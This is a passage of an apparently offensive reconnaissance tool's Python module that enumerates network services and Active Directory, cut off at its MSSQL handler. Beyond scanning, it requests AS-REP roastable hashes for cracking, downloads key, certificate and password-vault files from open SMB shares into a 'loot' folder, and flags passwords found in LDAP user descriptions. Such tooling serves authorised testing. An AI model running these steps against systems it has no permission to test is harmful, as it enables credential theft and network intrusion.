"""
Per-service enumeration mapped from the hakiki reference + AD/DC-specific additions.

Each handler: (ip, service, runner, findings, available) → list[Discovery]
Failures are caught and logged without aborting the scan.
"""
import re
import subprocess
from pathlib import Path

from lib.findings import FindingsSink as Findings
from lib.models import Discovery, Service
from lib.runner import Runner


def enumerate_service(
    ip: str,
    service: Service,
    runner: Runner,
    findings: Findings,
    available: set[str],
) -> list[Discovery]:
    port = service.port
    name = service.name.lower()

    handler = _PORT_MAP.get(port)
    if handler is None:
        for pattern, fn in _NAME_MAP.items():
            if pattern in name:
                handler = fn
                break

    findings.h3(
        f"{'TCP' if service.proto == 'tcp' else 'UDP'} {port} — {service.name.upper()}"
        + (f" ({service.version})" if service.version else "")
    )

    if handler is None:
        findings.note("No specific enumeration handler for this service.")
        return []

    try:
        return handler(ip, service, runner, findings, available) or []
    except Exception as exc:
        findings.note(f"Enumeration error: {exc}")
        return []


# ── FTP (21) ──────────────────────────────────────────────────────────────────

def _ftp(ip, service, runner, findings, available):
    cmd = ["nmap", "--script", "ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor",
           "-p", str(service.port), "-sV", ip]
    out = runner.run(cmd, f"ftp_{service.port}_nmap")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))

    result = subprocess.run(
        ["curl", "-sk", f"ftp://{ip}/", "--user", "anonymous:anonymous",
         "--connect-timeout", "10", "-l"],
        capture_output=True, text=True,
    )
    if result.returncode == 0:
        if result.stdout.strip():
            findings.bullet("**Anonymous FTP: ALLOWED**")
            findings.code_block(result.stdout.strip())
        else:
            findings.bullet("**Anonymous FTP: ALLOWED** (empty directory)")
    else:
        findings.bullet("Anonymous FTP: denied")

    return []


# ── SSH (22) ──────────────────────────────────────────────────────────────────

def _ssh(ip, service, runner, findings, available):
    cmd = ["nmap", "--script", "ssh-auth-methods,ssh2-enum-algos",
           "-p", str(service.port), ip]
    out = runner.run(cmd, f"ssh_{service.port}_nmap")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))
    return []


# ── Telnet (23) ───────────────────────────────────────────────────────────────

def _telnet(ip, service, runner, findings, available):
    cmd = ["nmap", "--script", "telnet-ntlm-info,telnet-encryption",
           "-p", str(service.port), ip]
    out = runner.run(cmd, f"telnet_{service.port}_nmap")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))

    # Banner grab via netcat — 5 seconds then close
    result = subprocess.run(
        ["nc", "-w", "5", ip, str(service.port)],
        capture_output=True, text=True, timeout=10,
    )
    if result.stdout.strip():
        findings.bullet("**Telnet banner:**")
        findings.code_block(result.stdout.strip()[:500])

    findings.note(
        "Telnet transmits in plaintext. If credentials found, connect: "
        f"`telnet {ip} {service.port}`"
    )
    return []


# ── SMTP (25, 587) ────────────────────────────────────────────────────────────

def _smtp(ip, service, runner, findings, available):
    cmd = ["nmap", "--script", "smtp-commands,smtp-open-relay",
           "-p", str(service.port), ip]
    out = runner.run(cmd, f"smtp_{service.port}_nmap")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))

    if "smtp-user-enum" in available:
        wordlist = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
        cmd2 = ["smtp-user-enum", "-M", "VRFY", "-U", wordlist,
                "-t", ip, "-p", str(service.port)]
        out2 = runner.run(cmd2, f"smtp_{service.port}_userenum", timeout=120)
        findings.cmd(" ".join(cmd2))
        findings.code_block(_trim(out2))
        # Aggregate valid users
        for line in out2.splitlines():
            m = re.search(r"^\S+\s+(\S+)\s+exists", line, re.IGNORECASE)
            if m:
                runner.ws.add_user(m.group(1).split("@")[0])

    return []


# ── DNS (53) ──────────────────────────────────────────────────────────────────

def _dns(ip, service, runner, findings, available):
    if "dig" not in available:
        findings.note("`dig` not available — skipping DNS checks")
        return []

    cmd = ["dig", "-x", ip, f"@{ip}"]
    out = runner.run(cmd, "dns_reverse_lookup")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))

    domain = service.hostname
    if domain:
        cmd2 = ["dig", "axfr", f"@{ip}", domain]
        out2 = runner.run(cmd2, f"dns_axfr_{domain}")
        findings.cmd(" ".join(cmd2))
        if "XFR size" in out2 or "Transfer failed" not in out2:
            findings.code_block(_trim(out2))

        # SRV record enumeration — reveals DC, LDAP, Kerberos, etc.
        for srv in ["_ldap._tcp", "_kerberos._tcp", "_kpasswd._tcp", "_gc._tcp",
                    "_msdcs", "_sites"]:
            cmd3 = ["dig", "SRV", f"{srv}.{domain}", f"@{ip}"]
            out3 = runner.run(cmd3, f"dns_srv_{srv.replace('.', '_')}_{domain}")
            findings.cmd(" ".join(cmd3))
            if "ANSWER SECTION" in out3:
                findings.code_block(_trim(out3))

        if "dnsrecon" in available:
            cmd4 = ["dnsrecon", "-d", domain, "-t", "axfr,std,brt",
                    "-D", "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
                    "-n", ip]
            out4 = runner.run(cmd4, f"dns_dnsrecon_{domain}", timeout=120)
            findings.cmd(" ".join(cmd4))
            findings.code_block(_trim(out4))

    return []


# ── Finger (79) ───────────────────────────────────────────────────────────────

def _finger(ip, service, runner, findings, available):
    cmd = ["nmap", "--script", "finger", "-p", str(service.port), ip]
    out = runner.run(cmd, f"finger_{service.port}_nmap")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))
    return []


# ── Kerberos (88) ─────────────────────────────────────────────────────────────

def _kerberos(ip, service, runner, findings, available):
    """
    Port 88 — Kerberos / Active Directory.
    Key operations (all unauthenticated):
      - nmap krb5-enum-users
      - kerbrute username enumeration
      - impacket-GetNPUsers AS-REP roasting (pre-auth disabled accounts)
    """
    port = service.port
    domain = service.hostname  # set by orchestrator from --domain

    if not domain:
        findings.note(
            "No `--domain` provided — Kerberos enumeration skipped. "
            "Re-run with `--domain DOMAIN` to enable kerbrute, krb5-enum-users, and AS-REP roasting."
        )
        return []

    cmd = [
        "nmap", "--script", "krb5-enum-users",
        "--script-args",
        f"krb5-enum-users.realm={domain},"
        "userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
        "-p", str(port), ip,
    ]
    out = runner.run(cmd, "krb_88_nmap")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))

    if "kerbrute" in available:
        wl = _best_userlist()
        cmd2 = ["kerbrute", "userenum", "--dc", ip, "-d", domain, wl]
        findings.cmd(" ".join(cmd2))
        out2 = runner.run(cmd2, "krb_kerbrute_userenum", timeout=300)
        _parse_kerbrute(out2, findings, runner)

    if "impacket-GetNPUsers" in available:
        cmd3 = [
            "impacket-GetNPUsers", f"{domain}/",
            "-no-pass", "-dc-ip", ip,
            "-request", "-format", "hashcat",
        ]
        findings.cmd(" ".join(cmd3))
        out3 = runner.run(cmd3, "krb_GetNPUsers", timeout=60)
        if "$krb5asrep$" in out3:
            findings.bullet("**AS-REP roastable hash(es) found — crack with hashcat -m 18200**")
        findings.code_block(_trim(out3))

    findings.note(
        f"Kerberoasting (needs valid creds): "
        f"`impacket-GetUserSPNs {domain}/USER:PASS -dc-ip {ip} -request -outputfile kerberoast.txt`"
    )
    return []


def _parse_kerbrute(output: str, findings: Findings, runner: Runner):
    valid = re.findall(r"VALID USERNAME:\s+(\S+)", output)
    if valid:
        findings.bullet(f"**Valid usernames ({len(valid)}):** {', '.join(valid)}")
        for user in valid:
            runner.ws.add_user(user.split("@")[0])
    else:
        findings.bullet("kerbrute: no valid usernames found")


def _best_userlist() -> str:
    candidates = [
        "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt",
        "/usr/share/seclists/Usernames/Names/names.txt",
        "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
    ]
    for wl in candidates:
        if Path(wl).exists():
            return wl
    return candidates[-1]


# ── POP3 (110, 995) ───────────────────────────────────────────────────────────

def _pop3(ip, service, runner, findings, available):
    cmd = ["nmap", "--script", "pop3-capabilities,pop3-ntlm-info",
           "-p", str(service.port), ip]
    out = runner.run(cmd, f"pop3_{service.port}_nmap")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))
    return []


# ── RPC / NFS bind (111) ──────────────────────────────────────────────────────

def _rpc(ip, service, runner, findings, available):
    if "rpcinfo" in available:
        cmd = ["rpcinfo", "-p", ip]
        out = runner.run(cmd, "rpc_rpcinfo")
        findings.cmd(" ".join(cmd))
        findings.code_block(_trim(out))

    if "showmount" in available:
        cmd2 = ["showmount", "-e", ip]
        out2 = runner.run(cmd2, "rpc_showmount")
        findings.cmd(" ".join(cmd2))
        findings.code_block(_trim(out2))

    return []


# ── IMAP (143, 993) ───────────────────────────────────────────────────────────

def _imap(ip, service, runner, findings, available):
    cmd = ["nmap", "--script", "imap-capabilities,imap-ntlm-info",
           "-p", str(service.port), ip]
    out = runner.run(cmd, f"imap_{service.port}_nmap")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))
    return []


# ── MSRPC (135) ───────────────────────────────────────────────────────────────

def _msrpc(ip, service, runner, findings, available):
    cmd = ["nmap", "--script", "msrpc-enum", "-p", str(service.port), ip]
    out = runner.run(cmd, f"msrpc_{service.port}_nmap")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))

    if "impacket-rpcdump" in available:
        cmd2 = ["impacket-rpcdump", "-p", str(service.port), ip]
        out2 = runner.run(cmd2, f"msrpc_{service.port}_rpcdump", timeout=60)
        findings.cmd(" ".join(cmd2))
        findings.code_block(_trim(out2))

    return []


def _parse_lookupsid(output: str, findings: Findings) -> list[str]:
    users = []
    for line in output.splitlines():
        # Format: 500: DOMAIN\Administrator (SidTypeUser)
        m = re.search(r"\d+:\s+\S+\\(\S+)\s+\(SidTypeUser\)", line)
        if m:
            users.append(m.group(1))
    if users:
        findings.bullet(f"**lookupsid users ({len(users)}):** {', '.join(users[:30])}")
    else:
        findings.code_block(_trim(output))
    return users


# ── SMB (139, 445) ────────────────────────────────────────────────────────────

def _smb(ip, service, runner, findings, available):
    port = service.port

    # SMB2 signing status — unsigned = relay attacks viable
    cmd_sign = ["nmap", "--script", "smb2-security-mode", "-p", str(port), ip]
    out_sign = runner.run(cmd_sign, f"smb_{port}_signing")
    findings.cmd(" ".join(cmd_sign))
    if "Message signing enabled but not required" in out_sign:
        findings.bullet("**SMB signing: NOT required — relay attacks (ntlmrelayx) viable**")
    elif "Message signing enabled and required" in out_sign:
        findings.bullet("SMB signing: required — relay attacks not viable")
    else:
        findings.code_block(_trim(out_sign))

    # OS discovery + share/user enum
    cmd_enum = ["nmap", "--script",
                "smb-os-discovery,smb-enum-shares,smb-enum-users,smb-security-mode",
                "-p", str(port), ip]
    out_enum = runner.run(cmd_enum, f"smb_{port}_nmap_enum")
    findings.cmd(" ".join(cmd_enum))
    findings.code_block(_trim(out_enum))

    # Vulnerability checks
    vuln_scripts = (
        "smb-vuln-ms17-010,"
        "smb-vuln-cve2009-3103,"
        "smb-vuln-ms10-054,"
        "smb-vuln-ms10-061,"
        "smb-double-pulsar-backdoor"
    )
    cmd_vuln = ["nmap", "--script", vuln_scripts,
                "--script-args", "unsafe=1", "-p", str(port), ip]
    out_vuln = runner.run(cmd_vuln, f"smb_{port}_nmap_vuln")
    findings.cmd(" ".join(cmd_vuln))
    for line in out_vuln.splitlines():
        if "VULNERABLE" in line:
            findings.bullet(f"**{line.strip()}**")
    findings.code_block(_trim(out_vuln))

    # Zerologon (CVE-2020-1472) — nxc module is safe (non-destructive check)
    if "nxc" in available:
        cmd_zl = ["nxc", "smb", ip, "-M", "zerologon"]
        out_zl = runner.run(cmd_zl, f"smb_{port}_zerologon", timeout=60)
        findings.cmd(" ".join(cmd_zl))
        if "VULNERABLE" in out_zl.upper():
            findings.bullet("**VULNERABLE to Zerologon (CVE-2020-1472)**")
        elif out_zl.strip():
            findings.bullet(f"Zerologon: not vulnerable")
        findings.code_block(_trim(out_zl))

    # Null session enumeration
    readable_shares: list[str] = []

    if "nxc" in available:
        cmd_null = ["nxc", "smb", ip, "-u", "", "-p", ""]
        out_null = runner.run(cmd_null, f"smb_{port}_nxc_null")
        findings.cmd(" ".join(cmd_null))
        findings.code_block(_trim(out_null))

        cmd_shares = ["nxc", "smb", ip, "-u", "", "-p", "", "--shares"]
        out_shares = runner.run(cmd_shares, f"smb_{port}_nxc_shares")
        findings.cmd(" ".join(cmd_shares))
        readable_shares = _parse_nxc_shares(out_shares, findings)

        cmd_users = ["nxc", "smb", ip, "-u", "", "-p", "", "--users"]
        out_users = runner.run(cmd_users, f"smb_{port}_nxc_users")
        findings.cmd(" ".join(cmd_users))
        _parse_nxc_users(out_users, findings, runner)

    if "smbmap" in available:
        cmd_smbmap = ["smbmap", "-H", ip]
        out_smbmap = runner.run(cmd_smbmap, f"smb_{port}_smbmap")
        findings.cmd(" ".join(cmd_smbmap))
        findings.code_block(_trim(out_smbmap))

    if "smbclient" in available:
        cmd_list = ["smbclient", "-N", "-L", f"\\\\{ip}"]
        out_list = runner.run(cmd_list, f"smb_{port}_smbclient_list")
        findings.cmd(" ".join(cmd_list))
        findings.code_block(_trim(out_list))

    # SID-brute user enumeration via null session
    if "impacket-lookupsid" in available:
        cmd_sid = ["impacket-lookupsid", f"anonymous:@{ip}"]
        out_sid = runner.run(cmd_sid, f"smb_{port}_lookupsid", timeout=60)
        findings.cmd(" ".join(cmd_sid))
        users = _parse_lookupsid(out_sid, findings)
        for u in users:
            runner.ws.add_user(u)

    # enum4linux-ng — comprehensive Windows/Samba enumeration
    if "enum4linux-ng" in available:
        cmd_e4l = ["enum4linux-ng", "-A", ip]
        out_e4l = runner.run(cmd_e4l, f"smb_{port}_enum4linux_ng", timeout=300)
        findings.cmd(" ".join(cmd_e4l))
        _parse_enum4linux(out_e4l, findings, runner)

    # Share spidering — list contents of READ-accessible shares
    if readable_shares:
        _smb_spider(ip, readable_shares, runner, findings, available)

    return []


def _parse_nxc_shares(output: str, findings: Findings) -> list[str]:
    """Print share access bullets, return list of READ-accessible share names."""
    readable: list[str] = []
    for line in output.splitlines():
        if re.search(r"READ|WRITE|NO ACCESS", line, re.IGNORECASE):
            findings.bullet(line.strip())
            m = re.search(r"\b([A-Za-z0-9_$.-]+)\s+READ", line, re.IGNORECASE)
            if m and m.group(1).upper() not in ("IPC$",):
                readable.append(m.group(1))
    if not readable:
        findings.code_block(_trim(output))
    return readable


def _parse_nxc_users(output: str, findings: Findings, runner: Runner):
    users = re.findall(r"\b([A-Za-z0-9._-]+)\s+badpwdcount", output, re.IGNORECASE)
    if users:
        findings.bullet(f"**SMB users:** {', '.join(users)}")
        for u in users:
            runner.ws.add_user(u)
    else:
        findings.code_block(_trim(output))


def _parse_enum4linux(output: str, findings: Findings, runner: Runner):
    """Extract key findings from enum4linux-ng output."""
    # Users
    users = re.findall(r"username:\s+(\S+)", output, re.IGNORECASE)
    if users:
        findings.bullet(f"**enum4linux-ng users:** {', '.join(users[:30])}")
        for u in users:
            runner.ws.add_user(u)
    # Password policy
    for field in ("Minimum password length", "Account lockout threshold",
                  "Password complexity"):
        m = re.search(rf"{field}[:\s]+(.+)", output, re.IGNORECASE)
        if m:
            findings.bullet(f"{field}: `{m.group(1).strip()}`")
    # Notable flags
    for line in output.splitlines():
        if any(kw in line for kw in ("Account Disabled", "Password Never Expires",
                                      "No Password Required", "Guest account")):
            findings.bullet(f"  `{line.strip()}`")


def _smb_spider(ip: str, shares: list[str], runner: Runner,
                findings: Findings, available: set[str]):
    """Recursively list and download interesting files from READ-accessible shares."""
    loot_dir = runner.ws.loot_dir / "smb"
    loot_dir.mkdir(parents=True, exist_ok=True)

    findings.h4("Share Spidering")
    for share in shares:
        findings.bullet(f"Spidering share: **{share}**")

        if "smbclient" in available:
            cmd = ["smbclient", f"\\\\{ip}\\{share}", "-N", "-c", "recurse; ls"]
            out = runner.run(cmd, f"smb_spider_{share}_list", timeout=60)
            findings.cmd(" ".join(cmd))
            if out.strip() and "NT_STATUS_ACCESS_DENIED" not in out:
                findings.code_block(_trim(out))

        # smbmap recursive listing with download of interesting files
        if "smbmap" in available:
            cmd2 = ["smbmap", "-H", ip, "-r", share, "--no-write-check", "-q"]
            out2 = runner.run(cmd2, f"smb_spider_{share}_smbmap", timeout=60)
            findings.cmd(" ".join(cmd2))
            if out2.strip() and "NT_STATUS_ACCESS_DENIED" not in out2:
                # Surface interesting files
                for line in out2.splitlines():
                    if re.search(
                        r"\.(txt|pdf|doc|docx|xls|xlsx|config|ini|conf|xml|log|bak|"
                        r"key|pem|pfx|p12|crt|zip|tar|7z|ps1|bat|sh|py|vbs|kdbx)$",
                        line, re.IGNORECASE
                    ):
                        findings.bullet(f"  Interesting: `{line.strip()}`")

        # Try nxc spider_plus module for automated file download
        if "nxc" in available:
            cmd3 = [
                "nxc", "smb", ip, "-u", "", "-p", "",
                "-M", "spider_plus",
                "-o", f"DOWNLOAD_FLAG=True", f"OUTPUT_FOLDER={str(loot_dir)}",
                "MAX_FILE_SIZE=5000000",
            ]
            out3 = runner.run(cmd3, f"smb_spider_{share}_nxc_spider", timeout=120)
            findings.cmd(" ".join(cmd3))
            if "Downloaded" in out3 or "file" in out3.lower():
                findings.bullet(f"  spider_plus downloaded files to `{loot_dir}`")


# ── SNMP (161, 162 UDP) ───────────────────────────────────────────────────────

def _snmp(ip, service, runner, findings, available):
    community_list = "/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt"

    communities = ["public", "private"]
    if "onesixtyone" in available:
        cmd = ["onesixtyone", "-c", community_list, ip]
        out = runner.run(cmd, "snmp_onesixtyone", timeout=60)
        findings.cmd(" ".join(cmd))
        findings.code_block(_trim(out))
        found = re.findall(r"\[(\w+)\]", out)
        if found:
            communities = found

    # snmp-check — structured, categorised output
    if "snmp-check" in available:
        for community in communities[:2]:
            cmd2 = ["snmp-check", ip, "-c", community]
            out2 = runner.run(cmd2, f"snmp_check_{community}", timeout=120)
            findings.cmd(" ".join(cmd2))
            if "timeout" not in out2.lower() and out2.strip():
                findings.bullet(f"Community **{community}** — see raw output for users/processes/software")
                findings.code_block(_trim(out2))
                break

    # Raw snmpwalk for MIB data snmp-check might miss
    if "snmpwalk" in available:
        for community in communities[:1]:
            cmd3 = ["snmpwalk", "-v", "2c", "-c", community, ip]
            out3 = runner.run(cmd3, f"snmp_walk_{community}", timeout=120)
            findings.cmd(" ".join(cmd3))
            _parse_snmp_walk(out3, community, findings, runner)

    # SNMPv3 — attempt with common usernames if v1/v2c succeeded or as fallback
    if "snmpwalk" in available:
        _snmp_v3(ip, runner, findings)

    return []


def _parse_snmp_walk(output: str, community: str, findings: Findings, runner: Runner):
    findings.bullet(f"Community string: **{community}**")
    oid_hints = {
        "1.3.6.1.2.1.1.5":        "Hostname",
        "1.3.6.1.2.1.25.4.2.1.2": "Running processes",
        "1.3.6.1.2.1.25.6.3.1.2": "Installed software",
        "1.3.6.1.4.1.77.1.2.25":  "Windows users",
        "1.3.6.1.2.1.6.13.1.3":   "Open TCP ports",
    }
    found: dict[str, list[str]] = {}
    for line in output.splitlines():
        for oid, label in oid_hints.items():
            if oid in line:
                val = line.split("=", 1)[-1].strip()
                found.setdefault(label, []).append(val)
    for label, values in found.items():
        preview = ", ".join(values[:5]) + (" …" if len(values) > 5 else "")
        findings.bullet(f"**{label}:** {preview}")
        if label == "Windows users":
            for v in values:
                # Strip STRING: "username" formatting
                u = re.sub(r'^STRING:\s*"?([^"]+)"?$', r"\1", v.strip())
                runner.ws.add_user(u)


def _snmp_v3(ip: str, runner: Runner, findings: Findings):
    """Attempt SNMPv3 enumeration with common usernames (noAuthNoPriv)."""
    v3_users = ["admin", "Administrator", "cisco", "operator", "monitor",
                "public", "private", "snmpuser", "v3user", "manager"]
    for username in v3_users:
        result = subprocess.run(
            ["snmpwalk", "-v", "3", "-l", "noAuthNoPriv", "-u", username, ip],
            capture_output=True, text=True, timeout=10,
        )
        if result.returncode == 0 and result.stdout.strip() and "No Such" not in result.stdout:
            findings.bullet(f"**SNMPv3 accessible — username: `{username}`**")
            findings.code_block(_trim(result.stdout))
            runner.ws.add_user(username)
            return  # Found one, stop trying
    findings.bullet("SNMPv3: no common usernames accepted (noAuthNoPriv)")


# ── LDAP (389, 636, 3268, 3269) ───────────────────────────────────────────────

def _ldap(ip, service, runner, findings, available):
    """
    Full LDAP/AD enumeration including:
      - Password policy
      - Users, computers, groups
      - AS-REP roastable accounts (no pre-auth)
      - Constrained / unconstrained delegation
      - AdminSDHolder-protected accounts
      - ldapdomaindump structured dump
      - BloodHound collection attempt
      - certipy ADCS template enumeration
    """
    port = service.port
    domain = service.hostname  # set by orchestrator from --domain

    gc_mode = port in (3268, 3269)
    proto = "ldaps" if port in (636, 3269) else "ldap"
    uri = f"{proto}://{ip}:{port}"

    if gc_mode:
        findings.note("Global Catalog port — enumerating forest-wide AD objects")

    if "ldapsearch" not in available:
        findings.note("`ldapsearch` not available")
        return []

    # 1. Base DN discovery
    cmd_base = ["ldapsearch", "-x", "-H", uri, "-b", "", "-s", "base"]
    out_base = runner.run(cmd_base, f"ldap_{port}_base")
    findings.cmd(" ".join(cmd_base))
    base_dn = _extract_ldap_base(out_base)
    if not base_dn and domain:
        base_dn = "DC=" + ",DC=".join(domain.split("."))
    if base_dn:
        findings.bullet(f"Base DN: `{base_dn}`")
    else:
        findings.code_block(_trim(out_base))
        findings.note("Anonymous bind may be disabled — LDAP queries skipped.")
        return []

    def lq(label: str, filt: str, *attrs) -> str:
        cmd = ["ldapsearch", "-x", "-H", uri, "-b", base_dn, filt, *attrs]
        out = runner.run(cmd, f"ldap_{port}_{label}", timeout=60)
        findings.cmd(" ".join(cmd))
        return out

    # 2. Password policy
    out_pp = lq("password_policy", "(objectClass=domain)",
                "minPwdLength", "maxPwdAge", "lockoutThreshold", "lockoutDuration", "pwdProperties")
    _parse_password_policy(out_pp, findings)

    # 3. Users
    out_users = lq("users", "(objectClass=person)",
                   "sAMAccountName", "description", "mail", "userAccountControl", "memberOf")
    _parse_ldap_users(out_users, findings, runner)

    # 4. Computers
    out_comp = lq("computers", "(objectClass=computer)",
                  "sAMAccountName", "operatingSystem", "operatingSystemVersion", "dNSHostName")
    _parse_ldap_computers(out_comp, findings)

    # 5. Groups
    out_grp = lq("groups", "(objectClass=group)", "cn", "description", "member")
    groups = re.findall(r"^cn:\s+(.+)", out_grp, re.MULTILINE)
    if groups:
        findings.bullet(f"**Groups ({len(groups)}):** {', '.join(groups[:20])}" +
                        (" …" if len(groups) > 20 else ""))

    # 6. AS-REP roastable (userAccountControl bit 4194304 = DONT_REQ_PREAUTH)
    out_asrep = lq("asrep_roastable",
                   "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
                   "sAMAccountName")
    asrep = re.findall(r"sAMAccountName:\s+(.+)", out_asrep)
    if asrep:
        findings.bullet(f"**AS-REP roastable (no pre-auth required): {', '.join(asrep)}**")
        findings.note(f"Crack with: `impacket-GetNPUsers {domain}/ -no-pass -dc-ip {ip} -request -format hashcat`")

    # Derive domain from base DN if --domain wasn't provided, and persist it
    # so the post-enum phase can use it for GetNPUsers / kerbrute with the
    # complete user list (assembled from all parallel handlers).
    effective_domain = domain or _dn_to_domain(base_dn)
    if effective_domain and not gc_mode:
        runner.ws.set_discovered_domain(effective_domain)

    # 7. Unconstrained delegation
    out_uncons = lq("unconstrained_delegation",
                    "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))",
                    "sAMAccountName", "dNSHostName")
    uncons = re.findall(r"sAMAccountName:\s+(.+)", out_uncons)
    if uncons:
        findings.bullet(f"**Unconstrained delegation (excluding DC itself):** {', '.join(uncons)}")

    # 8. Constrained delegation
    out_cons = lq("constrained_delegation", "(msDS-AllowedToDelegateTo=*)",
                  "sAMAccountName", "msDS-AllowedToDelegateTo")
    cons = re.findall(r"sAMAccountName:\s+(.+)", out_cons)
    if cons:
        findings.bullet(f"**Constrained delegation:** {', '.join(cons)}")

    # 9. AdminSDHolder-protected accounts (high-privilege)
    out_admin = lq("admincount", "(adminCount=1)", "sAMAccountName")
    admins = re.findall(r"sAMAccountName:\s+(.+)", out_admin)
    if admins:
        findings.bullet(f"**AdminSDHolder-protected (privileged):** {', '.join(admins)}")

    # 10. ADCS — certipy template enumeration (attempt anon/guest, note creds path)
    if "certipy" in available and domain:
        findings.h4("ADCS (certipy)")
        cmd_certy = [
            "certipy", "find",
            "-u", f"guest@{domain}",
            "-p", "",
            "-dc-ip", ip,
            "-vulnerable", "-stdout",
        ]
        findings.cmd(" ".join(cmd_certy))
        out_certy = runner.run(cmd_certy, f"ldap_{port}_certipy", timeout=120)
        if "ESC" in out_certy or "Vulnerable" in out_certy or "Template" in out_certy:
            findings.bullet("**certipy found ADCS misconfigurations — see raw output**")
            for line in out_certy.splitlines():
                if any(kw in line for kw in ("ESC", "Vulnerable", "[!]", "Template Name")):
                    findings.bullet(f"  `{line.strip()}`")
        else:
            findings.bullet(
                "certipy (guest): no results — needs credentials. "
                f"With creds: `certipy find -u USER@{domain} -p PASS -dc-ip {ip} -vulnerable -stdout`"
            )

    # 11. ldapdomaindump — structured HTML/JSON dump saved to loot/
    if "ldapdomaindump" in available and domain:
        dump_dir = str(runner.ws.loot_dir / "ldapdomaindump")
        Path(dump_dir).mkdir(parents=True, exist_ok=True)
        cmd_dump = [
            "ldapdomaindump",
            "-u", f"{domain}\\\\",
            "-p", "",
            ip,
            "-o", dump_dir,
            "--no-json", "--no-grep",
        ]
        out_dump = runner.run(cmd_dump, f"ldap_{port}_ldapdomaindump", timeout=120)
        findings.cmd(" ".join(cmd_dump))
        if "error" not in out_dump.lower():
            findings.bullet(f"**ldapdomaindump:** saved to `{dump_dir}`")
        else:
            findings.bullet("ldapdomaindump: anonymous bind not sufficient — needs credentials")

    # 12. BloodHound collection (try anonymous — usually needs creds but worth attempting)
    if "bloodhound-python" in available and domain:
        bh_dir = str(runner.ws.loot_dir / "bloodhound")
        Path(bh_dir).mkdir(parents=True, exist_ok=True)
        cmd_bh = [
            "bloodhound-python",
            "-d", domain,
            "-u", "guest",
            "-p", "",
            "-ns", ip,
            "-c", "All",
            "--zip",
            "-o", bh_dir,
        ]
        findings.cmd(" ".join(cmd_bh))
        out_bh = runner.run(cmd_bh, f"ldap_{port}_bloodhound", timeout=300)
        if ".zip" in out_bh.lower():
            findings.bullet(f"**BloodHound data collected** — import zip from `{bh_dir}`")
        else:
            findings.bullet("BloodHound: anonymous/guest collection failed — needs valid credentials")
            findings.note(
                f"With creds: `bloodhound-python -d {domain} -u USER -p PASS "
                f"-ns {ip} -c All --zip`"
            )

    return []


def _parse_password_policy(output: str, findings: Findings):
    fields = {
        "minPwdLength":     "Min password length",
        "lockoutThreshold": "Lockout threshold",
        "lockoutDuration":  "Lockout duration",
        "maxPwdAge":        "Max password age",
    }
    for attr, label in fields.items():
        m = re.search(rf"^{attr}:\s+(.+)", output, re.MULTILINE)
        if m:
            findings.bullet(f"{label}: `{m.group(1).strip()}`")


def _extract_ldap_base(output: str) -> str:
    m = re.search(r"namingContexts:\s+(.+)", output)
    return m.group(1).strip() if m else ""


def _dn_to_domain(base_dn: str) -> str:
    parts = re.findall(r"DC=([^,]+)", base_dn, re.IGNORECASE)
    return ".".join(parts) if parts else ""


_DESC_BOILERPLATE = {
    "built-in account for administering the computer/domain",
    "built-in account for guest access to the computer/domain",
    "a user account managed by the system.",
    "key distribution center service account",
}

def _looks_like_credential(desc: str) -> bool:
    d = desc.strip()
    lower = d.lower()
    if any(lower.startswith(b[:35]) for b in _DESC_BOILERPLATE):
        return False
    if len(d) < 4 or len(d) > 80:
        return False
    if d.endswith(".") and len(d) > 20:  # sentence, not a password
        return False
    if " " not in d:                     # single token — suspicious
        return True
    # Multi-word but short and has digit or special char
    if len(d) <= 30 and re.search(r'[\d!@#$%^&*()\-_=+\[\]{}|;:,.<>?/]', d):
        return True
    return False


def _parse_ldap_users(output: str, findings: Findings, runner: Runner):
    accounts = re.findall(r"sAMAccountName:\s+(.+)", output)
    descriptions = re.findall(r"description:\s+(.+)", output)
    if accounts:
        findings.bullet(f"**Users ({len(accounts)}):** {', '.join(accounts[:30])}" +
                        (" …" if len(accounts) > 30 else ""))
        for u in accounts:
            runner.ws.add_user(u.strip())
    if descriptions:
        findings.bullet("**User descriptions (check for passwords):**")
        for d in descriptions[:10]:
            stripped = d.strip()
            if _looks_like_credential(stripped):
                findings.bullet(f"  ⚠ **Possible credential:** `{stripped}`")
            else:
                findings.bullet(f"  `{stripped}`")


def _parse_ldap_computers(output: str, findings: Findings):
    hostnames = re.findall(r"dNSHostName:\s+(.+)", output)
    os_list = re.findall(r"operatingSystem:\s+(.+)", output)
    if hostnames:
        findings.bullet(f"**Computers:** {', '.join(hostnames[:20])}")
    if os_list:
        from collections import Counter
        counts = Counter(os_list)
        findings.bullet("**Operating systems:** " +
                        ", ".join(f"{os} ×{n}" for os, n in counts.most_common(5)))


# ── Rsync (873) ───────────────────────────────────────────────────────────────

def _rsync(ip, service, runner, findings, available):
    if "rsync" not in available:
        findings.note("`rsync` not available")
        return []

    cmd = ["rsync", f"rsync://{ip}/"]
    out = runner.run(cmd, "rsync_list", timeout=30)
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))

    for module in re.findall(r"^(\S+)", out, re.MULTILINE):
        if module and not module.startswith("["):
            cmd2 = ["rsync", "-av", "--list-only", f"rsync://{ip}/{module}/"]
            out2 = runner.run(cmd2, f"rsync_module_{module}", timeout=30)
            findings.cmd(" ".join(cmd2))
            findings.code_block(_trim(out2))

    return []


# ── MSSQL (1433) ─────────────────────────────────────────────────────────────

def _mssql(ip, service, runner, findings, available):
    cmd = ["nmap", "--script",
           "ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info,ms-sql-config",
           "-p", str(service.port), ip]
